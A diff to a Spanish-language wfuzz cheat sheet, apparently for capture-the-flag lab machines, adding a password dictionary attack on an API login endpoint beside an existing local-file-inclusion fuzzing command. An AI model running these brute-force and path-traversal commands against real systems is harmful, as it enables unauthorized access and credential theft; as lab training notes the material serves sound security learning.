@@ -162,4 +162,12 @@ WFUZZ en Local File Inclusion(LFI):
 ┌─[root@kali]─[/Documents/machines/demo/]
 └──╼ wfuzz -c --hc=404 -w /usr/share/wordlists/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt -u "http://10.10.10.249/admin../admin_staging/index.php?page=../../../../../../FUZZ"
 ```
+
+Ataque por diccionario para obtener credenciales de una API:
+
+```bash
+┌─[root@kali]─[/Documents/machines/demo/]
+└──╼ wfuzz -d '{"email":"test@forge.htb","password":"FUZZ"}' -H 'Content-Type: application/json' -z file,/usr/share/wordlists/rockyou.txt -u http://10.10.10.249/identity/api/auth/login --hc 405
+```
+
 Para abrir el manual de Wfuzz se ocupa ```man wfuzz```.
